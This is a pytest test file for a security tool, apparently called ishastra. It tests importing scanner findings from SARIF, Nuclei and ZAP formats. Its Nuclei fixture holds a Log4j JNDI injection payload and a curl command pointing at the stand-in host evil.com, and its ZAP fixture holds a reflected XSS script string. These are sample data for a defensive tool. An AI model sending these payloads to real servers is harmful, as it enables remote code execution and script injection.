"""Tests for importing findings from external scanner formats."""

from __future__ import annotations

import copy
import json
import sys
import tempfile
from pathlib import Path

import pytest

from ishastra.core.findings import Finding
from ishastra.core.imports import (
    import_findings,
    import_nuclei,
    import_sarif,
    import_zap,
)

# Sample SARIF content
SAMPLE_SARIF = {
    "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
    "version": "2.1.0",
    "runs": [
        {
            "tool": {
                "driver": {
                    "name": "test-tool",
                    "version": "1.0.0",
                    "rules": [
                        {
                            "id": "sql-injection",
                            "name": "SQL Injection",
                            "shortDescription": {"text": "SQL Injection vulnerability"},
                            "help": {"text": "Use parameterized queries"},
                            "properties": {
                                "tags": ["cwe-89", "security"],
                                "security-severity": "8.5",
                            },
                        }
                    ],
                }
            },
            "results": [
                {
                    "ruleId": "sql-injection",
                    "level": "error",
                    "message": {"text": "SQL injection found in login form"},
                    "locations": [
                        {
                            "physicalLocation": {
                                "artifactLocation": {"uri": "https://example.com/login"},
                                "region": {"startLine": 42},
                            }
                        }
                    ],
                    "partialFingerprints": {
                        "confidence": "high",
                        "verification": "observed",
                    },
                }
            ],
        }
    ],
}


# Sample Nuclei JSONL content
SAMPLE_NUCLEI = [
    {
        "template-id": "cve-2021-44228",
        "templateID": "cve-2021-44228",
        "info": {
            "name": "Log4j RCE",
            "severity": "critical",
            "description": "Apache Log4j2 Remote Code Execution",
            "tags": ["cve", "cwe-502", "rce"],
            "remediation": "Upgrade Log4j to 2.17.0+",
            "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        },
        "host": "https://vulnerable.example.com",
        "matched-at": "https://vulnerable.example.com/api/log",
        "extracted-results": ["${jndi:ldap://evil.com/a}"],
        "curl-command": "curl -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' https://vulnerable.example.com/api/log",
        "version": "3.0.0",
    },
    {
        "template-id": "exposed-swagger",
        "info": {
            "name": "Exposed Swagger UI",
            "severity": "info",
            "description": "Swagger UI is exposed",
            "tags": ["exposure", "swagger"],
        },
        "host": "https://api.example.com",
        "matched-at": "https://api.example.com/swagger",
        "version": "3.0.0",
    },
]


# Sample ZAP JSON content
SAMPLE_ZAP = {
    "@version": "2.14.0",
    "site": [
        {
            "@host": "example.com",
            "@port": "443",
            "@ssl": "true",
            "alerts": [
                {
                    "pluginid": "40012",
                    "pluginId": "40012",
                    "name": "Cross Site Scripting (Reflected)",
                    "alert": "Cross Site Scripting (Reflected)",
                    "riskcode": "2",
                    "risk": "High",
                    "confidence": "Medium",
                    "desc": "Cross-site Scripting (XSS) vulnerability",
                    "cweid": "79",
                    "cweId": "79",
                    "solution": "Apply proper output encoding",
                    "references": "https://owasp.org/www-community/attacks/xss/",
                    "instances": [
                        {
                            "uri": "https://example.com/search?q=test",
                            "method": "GET",
                            "param": "q",
                            "attack": "<script>alert(1)</script>",
                            "evidence": "<script>alert(1)</script>",
                        }
                    ],
                },
                {
                    "pluginid": "10096",
                    "pluginId": "10096",
                    "name": "Server Leaks Version Information",
                    "alert": "Server Leaks Version Information",
                    "riskcode": "0",
                    "risk": "Informational",
                    "confidence": "High",
                    "desc": "Server header reveals version",
                    "cweid": "200",
                    "cweId": "200",
                    "solution": "Configure server to hide version",
                    "references": "",
                    "instances": [
                        {
                            "uri": "https://example.com/",
                            "method": "GET",
                            "param": "",
                            "attack": "",
                            "evidence": "Apache/2.4.41",
                        }
                    ],
                },
            ],
        }
    ],
}


class TestImportSarif:
    """Tests for SARIF import."""

    def test_import_sarif_basic(self):
        """Test basic SARIF import."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
            json.dump(SAMPLE_SARIF, f)
            f.flush()
            findings = import_sarif(f.name)

        assert len(findings) == 1
        finding = findings[0]
        assert isinstance(finding, Finding)
        assert finding.category == "sql-injection"
        assert finding.title == "SQL Injection vulnerability"
        assert finding.severity == "high"  # error -> high
        assert finding.confidence == "high"
        assert finding.verification == "observed"
        assert finding.asset == "https://example.com/login"
        assert finding.location == "https://example.com/login:42"
        assert finding.cwe == "CWE-89"
        assert finding.cvss_score == "8.5"
        assert finding.detector == "test-tool"
        assert finding.detector_version == "1.0.0"

    def test_import_sarif_multiple_results(self):
        """Test SARIF with multiple results."""
        sarif = copy.deepcopy(SAMPLE_SARIF)
        sarif["runs"][0]["results"].append(
            {
                "ruleId": "xss",
                "level": "warning",
                "message": {"text": "XSS found"},
                "locations": [
                    {
                        "physicalLocation": {
                            "artifactLocation": {"uri": "https://example.com/search"},
                            "region": {"startLine": 10},
                        }
                    }
                ],
            }
        )
        sarif["runs"][0]["tool"]["driver"]["rules"].append(
            {
                "id": "xss",
                "name": "XSS",
                "shortDescription": {"text": "Cross-site scripting"},
                "help": {"text": "Encode output"},
                "properties": {"tags": ["cwe-79"]},
            }
        )

        with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
            json.dump(sarif, f)
            f.flush()
            findings = import_sarif(f.name)

        assert len(findings) == 2
        categories = {f.category for f in findings}
        assert categories == {"sql-injection", "xss"}

    def test_import_sarif_severity_mapping(self):
        """Test SARIF severity level mapping."""
        for level, expected_severity in [
            ("error", "high"),
            ("warning", "medium"),
            ("note", "low"),
            ("none", "info"),
        ]:
            sarif = dict(SAMPLE_SARIF)
            sarif["runs"][0]["results"][0]["level"] = level
            with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
                json.dump(sarif, f)
                f.flush()
                findings = import_sarif(f.name)
            assert findings[0].severity == expected_severity


class TestImportNuclei:
    """Tests for Nuclei import."""

    def test_import_nuclei_basic(self):
        """Test basic Nuclei JSONL import."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".jsonl", delete=False) as f:
            for item in SAMPLE_NUCLEI:
                f.write(json.dumps(item) + "\n")
            f.flush()
            findings = import_nuclei(f.name)

        assert len(findings) == 2

        # First finding - critical
        f1 = findings[0]
        assert f1.category == "cve-2021-44228"
        assert f1.title == "Log4j RCE"
        assert f1.severity == "critical"
        assert f1.confidence == "high"
        assert f1.asset == "https://vulnerable.example.com"
        assert f1.location == "https://vulnerable.example.com/api/log"
        assert f1.cwe == "CWE-502"
        assert f1.detector == "nuclei"
        assert f1.detector_version == "3.0.0"
        assert "${jndi:ldap://evil.com/a}" in f1.evidence

        # Second finding - info
        f2 = findings[1]
        assert f2.category == "exposed-swagger"
        assert f2.severity == "info"
        assert f2.confidence == "medium"
        assert f2.cwe == ""

    def test_import_nuclei_severity_mapping(self):
        """Test Nuclei severity mapping."""
        for nuclei_sev, expected in [
            ("critical", "critical"),
            ("high", "high"),
            ("medium", "medium"),
            ("low", "low"),
            ("info", "info"),
            ("unknown", "info"),
        ]:
            item = dict(SAMPLE_NUCLEI[0])
            item["info"]["severity"] = nuclei_sev
            with tempfile.NamedTemporaryFile(mode="w", suffix=".jsonl", delete=False) as f:
                f.write(json.dumps(item) + "\n")
                f.flush()
                findings = import_nuclei(f.name)
            assert findings[0].severity == expected


class TestImportZap:
    """Tests for ZAP import."""

    def test_import_zap_basic(self):
        """Test basic ZAP JSON import."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(SAMPLE_ZAP, f)
            f.flush()
            findings = import_zap(f.name)

        assert len(findings) == 2

        # First finding - XSS High
        f1 = findings[0]
        assert f1.category == "zap-40012"
        assert f1.title == "Cross Site Scripting (Reflected)"
        assert f1.severity == "high"  # riskcode 2 -> High -> high
        assert f1.confidence == "medium"
        assert f1.asset == "example.com:443"
        assert "search?q=test" in f1.location
        assert f1.cwe == "CWE-79"
        assert f1.detector == "zap"
        assert f1.detector_version == "2.14.0"
        assert "GET https://example.com/search?q=test" in f1.evidence

        # Second finding - Info
        f2 = findings[1]
        assert f2.category == "zap-10096"
        assert f2.severity == "info"  # riskcode 0 -> Informational -> info
        assert f2.confidence == "high"
        assert f2.cwe == "CWE-200"

    def test_import_zap_risk_mapping(self):
        """Test ZAP risk code mapping."""
        risk_map = {
            "3": ("High", "high"),
            "2": ("Medium", "medium"),
            "1": ("Low", "low"),
            "0": ("Informational", "info"),
        }
        for riskcode, (risk_str, expected) in risk_map.items():
            zap = copy.deepcopy(SAMPLE_ZAP)
            zap["site"][0]["alerts"][0]["riskcode"] = riskcode
            zap["site"][0]["alerts"][0]["risk"] = risk_str
            with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
                json.dump(zap, f)
                f.flush()
                findings = import_zap(f.name)
            assert findings[0].severity == expected, f"Failed for riskcode {riskcode}"


class TestImportFindings:
    """Tests for the unified import_findings function."""

    def test_import_findings_sarif(self):
        """Test import_findings with SARIF format."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
            json.dump(SAMPLE_SARIF, f)
            f.flush()
            findings = import_findings(f.name, "sarif", "eng-123", "job-456")

        assert len(findings) == 1
        assert "engagement:eng-123" in findings[0].sources
        assert "job:job-456" in findings[0].sources

    def test_import_findings_nuclei(self):
        """Test import_findings with Nuclei format."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".jsonl", delete=False) as f:
            for item in SAMPLE_NUCLEI:
                f.write(json.dumps(item) + "\n")
            f.flush()
            findings = import_findings(f.name, "nuclei", "eng-123", "")

        assert len(findings) == 2
        assert "engagement:eng-123" in findings[0].sources

    def test_import_findings_zap(self):
        """Test import_findings with ZAP format."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(SAMPLE_ZAP, f)
            f.flush()
            findings = import_findings(f.name, "zap", "", "job-789")

        assert len(findings) == 2
        assert "job:job-789" in findings[0].sources

    def test_import_findings_tags_duplicate_findings(self):
        """Every imported finding is tagged, even when two compare equal."""
        sarif = copy.deepcopy(SAMPLE_SARIF)
        sarif["runs"][0]["results"].append(copy.deepcopy(sarif["runs"][0]["results"][0]))

        with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
            json.dump(sarif, f)
            f.flush()
            findings = import_findings(f.name, "sarif", "eng-123", "job-456")

        assert len(findings) == 2
        for finding in findings:
            assert "engagement:eng-123" in finding.sources
            assert "job:job-456" in finding.sources
            assert finding.discovered_date

    def test_import_findings_invalid_format(self):
        """Test import_findings with invalid format."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({}, f)
            f.flush()
            with pytest.raises(ValueError, match="Unsupported format"):
                import_findings(f.name, "invalid")


class TestImportCLI:
    """Tests for CLI import commands."""

    def test_cli_import_sarif(self, capsys):
        """Test CLI import-sarif command."""
        from ishastra.cli import main

        with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
            json.dump(SAMPLE_SARIF, f)
            sarif_path = f.name

        with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
            output_path = f.name

        # Test import-sarif command
        sys.argv = [
            "ishastra",
            "import-sarif",
            sarif_path,
            "--output",
            output_path,
            "--engagement",
            "eng-1",
            "--job",
            "job-1",
        ]
        try:
            main()
        except SystemExit as e:
            assert e.code == 0

        # Verify output
        output = Path(output_path).read_text()
        sarif = json.loads(output)
        assert sarif["runs"][0]["results"][0]["ruleId"] == "sql-injection"

    def test_cli_import_nuclei(self, capsys):
        """Test CLI import-nuclei command."""
        from ishastra.cli import main

        with tempfile.NamedTemporaryFile(mode="w", suffix=".jsonl", delete=False) as f:
            for item in SAMPLE_NUCLEI:
                f.write(json.dumps(item) + "\n")
            nuclei_path = f.name

        with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
            output_path = f.name

        sys.argv = ["ishastra", "import-nuclei", nuclei_path, "--output", output_path]
        try:
            main()
        except SystemExit as e:
            assert e.code == 0

        output = Path(output_path).read_text()
        sarif = json.loads(output)
        assert len(sarif["runs"][0]["results"]) == 2

    def test_cli_import_zap(self, capsys):
        """Test CLI import-zap command."""
        from ishastra.cli import main

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(SAMPLE_ZAP, f)
            zap_path = f.name

        with tempfile.NamedTemporaryFile(mode="w", suffix=".sarif", delete=False) as f:
            output_path = f.name

        sys.argv = ["ishastra", "import-zap", zap_path, "--output", output_path]
        try:
            main()
        except SystemExit as e:
            assert e.code == 0

        output = Path(output_path).read_text()
        sarif = json.loads(output)
        assert len(sarif["runs"][0]["results"]) == 2
